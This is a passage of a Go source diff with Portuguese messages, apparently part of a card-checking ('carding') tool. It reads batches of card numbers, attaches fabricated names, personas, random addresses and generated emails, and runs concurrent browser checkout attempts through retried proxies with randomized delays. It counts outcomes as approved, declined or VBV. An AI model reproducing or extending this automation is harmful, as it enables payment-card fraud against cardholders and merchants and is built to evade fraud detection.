+				i, dados.Nome, card.Numero, reg.UF, persona.Nome)
+		}
+
+		if len(lote) == 0 {
+			fmt.Println("\n  Arquivos esgotados. Encerrando.")
+			break
+		}
+
+		type endRes struct {
+			i   int
+			end *Pessoa4Devs
+		}
+		endCh := make(chan endRes, len(lote))
+		for i := range lote {
+			go func(i int) {
+				end, err := buscarEnderecoAleatorio(lote[i].reg.UF)
+				if err != nil {
+					fmt.Printf("  [slot %d] erro endereço: %v\n", lote[i].id, err)
+					endCh <- endRes{i, nil}
+				} else {
+					endCh <- endRes{i, end}
+				}
+			}(i)
+		}
+		for range lote {
+			r := <-endCh
+			lote[r.i].end = r.end
+			if lote[r.i].end != nil {
+				lote[r.i].email = gerarEmail(lote[r.i].dados.Nome)
+			}
+		}
+
+		var wg sync.WaitGroup
+		for _, slot := range lote {
+			if slot.end == nil {
+				fmt.Printf("  [slot %d] sem endereço — pulando.\n", slot.id)
+				gp.addErro()
+				continue
+			}
+			wg.Add(1)
+			slot := slot
+			go func() {
+				defer wg.Done()
+				const maxRetryProxy = 4
+				for tentativa := 1; tentativa <= maxRetryProxy; tentativa++ {
+					if tentativa > 1 {
+						espera := time.Duration(tentativa*3) * time.Second
+						fmt.Printf("  [worker %d] proxy falhou — retry %d/%d em %s...\n",
+							slot.id, tentativa, maxRetryProxy, espera)
+						time.Sleep(espera)
+					}
+					if tentativa == 1 {
+						time.Sleep(time.Duration(randInt(500, 3500)) * time.Millisecond)
+					}
+					fmt.Printf("\n  [worker %d] → iniciando browser (tentativa %d) [persona=%s]\n",
+						slot.id, tentativa, slot.persona.Nome)
+
+					resultado := fluxoCompleto(slot.dados, slot.card, slot.end, slot.email, slot.url, slot.reg, slot.persona, moedaEscolhida)
+
+					if resultado == 1 {
+						gp.addAprovada()
+						break
+					}
+					if resultado == 0 {
+						gp.addRecusada()
+						break
+					}
+					if resultado == -2 {
+						gp.addVBV()
+						break
+					}
+					if tentativa >= maxRetryProxy {
+						gp.addErro()
+						break
+					}
+					continue
+				}
+				fmt.Printf("  [worker %d] → browser encerrado\n", slot.id)
+			}()
+		}
+		wg.Wait()
+
+		gp.render(fmt.Sprintf("APÓS ONDA %d", onda))
+
+		fmt.Printf("  ══ Onda %d concluída. Aguardando 5s... ══\n", onda)
+		time.Sleep(5 * time.Second)
+	}
+
+	gp.render("RESULTADO FINAL")
+
+	fmt.Println(cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
+	fmt.Println(cor(cCyan+cBold, "║      TODAS AS ONDAS CONCLUÍDAS           ║"))
+	fmt.Println(cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
+}
